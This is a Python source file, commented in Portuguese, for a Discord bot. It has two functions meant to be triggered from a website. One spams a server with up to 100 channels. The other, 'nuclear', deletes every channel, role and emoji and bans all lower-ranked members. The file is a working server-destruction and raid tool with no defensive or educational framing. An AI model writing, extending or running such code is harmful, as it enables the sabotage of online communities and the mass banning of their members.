import discord
from discord.ext import commands
import asyncio
import os
import sys

# ==================== CONFIGURAÇÃO ====================

TOKEN = os.getenv('DISCORD_TOKEN')

if TOKEN is None:
    print("❌ ERRO: DISCORD_TOKEN não encontrado!")
    sys.exit(1)

# Intents necessários
intents = discord.Intents.default()
intents.guilds = True
intents.members = True

class GDPBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents, help_command=None)
        self.target_guild = None
    
    async def setup_hook(self):
        print(f"✅ Bot iniciado com sucesso!")
    
    async def on_ready(self):
        print(f"✅ Bot online: {self.user}")
        print(f"📡 Servidores disponíveis:")
        for guild in self.guilds:
            print(f"   • {guild.name} (ID: {guild.id})")

bot = GDPBot()

# ==================== FUNÇÕES DE EXECUÇÃO DIRETA ====================

async def executar_gdp(guild_id: int, quantidade: int = 100):
    """Executa GDP diretamente sem precisar de comando no chat"""
    
    guild = bot.get_guild(guild_id)
    if not guild:
        return {"erro": f"Servidor {guild_id} não encontrado"}
    
    # Verificar permissões
    if not guild.me.guild_permissions.manage_channels:
        return {"erro": "Bot não tem permissão para criar canais"}
    
    criados = 0
    erros = 0
    
    for i in range(1, quantidade + 1):
        try:
            nome = f"G.D.P-{i:03d}"
            
            # Verifica se canal já existe
            if discord.utils.get(guild.channels, name=nome):
                continue
            
            await guild.create_text_channel(
                nome,
                reason="Comando GDP via site"
            )
            criados += 1
            
            # Pequena pausa para evitar rate limit
            if i % 10 == 0:
                await asyncio.sleep(1)
            else:
                await asyncio.sleep(0.5)
                
        except Exception as e:
            erros += 1
            print(f"Erro ao criar canal {i}: {e}")
    
    return {
        "sucesso": True,
        "criados": criados,
        "erros": erros,
        "total": quantidade
    }

async def executar_nuclear(guild_id: int):
    """Executa nuclear diretamente sem precisar de comando no chat"""
    
    guild = bot.get_guild(guild_id)
    if not guild:
        return {"erro": f"Servidor {guild_id} não encontrado"}
    
    # Verificar permissões
    if not guild.me.guild_permissions.administrator:
        return {"erro": "Bot precisa ser administrador"}
    
    resultados = {
        "canais": 0,
        "cargos": 0,
        "emojis": 0,
        "banidos": 0,
        "erros": 0
    }
    
    # 1. DELETAR CANAIS
    for channel in guild.channels:
        try:
            await channel.delete()
            resultados["canais"] += 1
            await asyncio.sleep(0.3)
        except:
            resultados["erros"] += 1
    
    # 2. DELETAR CARGOS (exceto @everyone)
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed and role < guild.me.top_role:
            try:
                await role.delete()
                resultados["cargos"] += 1
                await asyncio.sleep(0.3)
            except:
                resultados["erros"] += 1
    
    # 3. DELETAR EMOJIS
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            resultados["emojis"] += 1
            await asyncio.sleep(0.3)
        except:
            resultados["erros"] += 1
    
    # 4. BANIR MEMBROS
    for member in guild.members:
        if member != guild.me and member.top_role < guild.me.top_role:
            try:
                await member.ban(reason="Nuclear via site")
                resultados["banidos"] += 1
                await asyncio.sleep(1)
            except:
                resultados["erros"] += 1
    
    # Criar canal de log
    try:
        log_channel = await guild.create_text_channel("🚨-nuclear-log")
        embed = discord.Embed(
            title="☢️ NUCLEAR EXECUTADO",
            description="Limpeza completa realizada via site",
            color=0xff0000
        )
        embed.add_field(name="Canais deletados", value=resultados["canais"])
        embed.add_field(name="Cargos deletados", value=resultados["cargos"])
        embed.add_field(name="Emojis deletados", value=resultados["emojis"])
        embed.add_field(name="Membros banidos", value=resultados["banidos"])
        embed.add_field(name="Erros", value=resultados["erros"])
        await log_channel.send(embed=embed)
    except:
        pass
    
    return {
        "sucesso": True,
        "resultados": resultados
    }

# ==================== INICIAR BOT ====================

if __name__ == "__main__":
    bot.run(TOKEN)